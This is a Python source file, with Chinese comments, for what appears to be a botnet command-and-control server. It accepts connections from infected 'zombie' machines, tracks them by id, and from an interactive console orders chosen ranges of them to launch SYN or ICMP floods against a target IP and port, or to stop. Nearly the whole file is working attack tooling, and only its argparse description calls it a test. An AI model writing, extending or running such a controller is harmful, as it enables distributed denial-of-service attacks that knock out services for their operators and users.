import socket
import json
import threading
import argparse

class Controller:
    def __init__(self, control_port=9999):
        self.zombie_num=0
        self.zombies = []  # 存储僵尸机信息
        self.control_port = control_port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def start_server(self):
        self.server_socket.bind(('0.0.0.0', self.control_port))
        self.server_socket.listen(5)
        print(f"控制端启动，监听端口 {self.control_port}")
        
        # 接受僵尸机连接
        while True:
            client, addr = self.server_socket.accept()
            self.zombie_num+=1
            self.zombies.append({"socket": client, "addr": addr,"id":self.zombie_num,"state":"rest"})
            print(f"僵尸机 {addr} 已连接")
            
    def send_attack_command(self, target_ip,method,target_port=2333,num1=1,num2=1):
        command = {
            "action": "attack",
            "target": target_ip,
            "method":method,
            "port":target_port
        }
        
        for zombie in self.zombies:
            if zombie["id"]>=num1 and zombie["id"]<=num2 :
                try:
                    zombie["socket"].send(json.dumps(command).encode())
                    print(f"已向 {zombie['addr']} 发送攻击命令")
                    zombie["state"]="{} attacking".format(method)
                except:
                    self.zombies.remove(zombie)
                    print(f"僵尸机 {zombie['addr']} 断开连接")
                
    def stop_attack(self,num1,num2):
        command = {
            "action": "stop"
        }
        
        for zombie in self.zombies:
            if zombie["id"]>=num1 and zombie["id"]<=num2 :
                try:
                    zombie["socket"].send(json.dumps(command).encode())
                    print(f"已向 {zombie['addr']} 发送停止命令")
                    zombie["state"]="rest"
                except:
                    self.zombies.remove(zombie)
    def show_list(self):
        command = {
            "action": "hi"
        }
        
        for zombie in self.zombies:
            try:
                zombie["socket"].send(json.dumps(command).encode())
                print("id:{id} | addr:{addr} | state:{state}".format(id=zombie["id"],addr=zombie["addr"],state=zombie["state"]))
            except:
                self.zombies.remove(zombie)

def main():
    parser = argparse.ArgumentParser(description='DDoS测试控制端')
    parser.add_argument('-p', '--port', type=int, default=2333, help='控制端口')
    args = parser.parse_args()
    
    controller = Controller(args.port)
    
    # 启动服务器线程
    server_thread = threading.Thread(target=controller.start_server)
    server_thread.daemon = True
    server_thread.start()
    
    while True:
        cmd = input("\n输入命令 (attack/stop/exit/list): ")
        if cmd == "attack":
            num1=int(input("开始的编号"))
            num2=int(input("结束的编号"))
            print("id: {}~{} 的僵尸机将开始攻击".format(num1,num2))
            method=input("输入攻击方式(syn/icmp)")
            target = input("输入目标IP: ")
            target_port=2333
            if method == "syn":
                target_port=int(input("输入目标端口port:"))
            controller.send_attack_command(target,method,target_port,num1,num2)
        elif cmd == "stop":
            num1=int(input("开始的编号"))
            num2=int(input("结束的编号"))
            print("id: {}~{} 的僵尸机将停止攻击".format(num1,num2))
            
            controller.stop_attack(num1,num2)
        elif cmd == "list":
            controller.show_list()
        elif cmd == "exit":
            break

if __name__ == "__main__":
    main()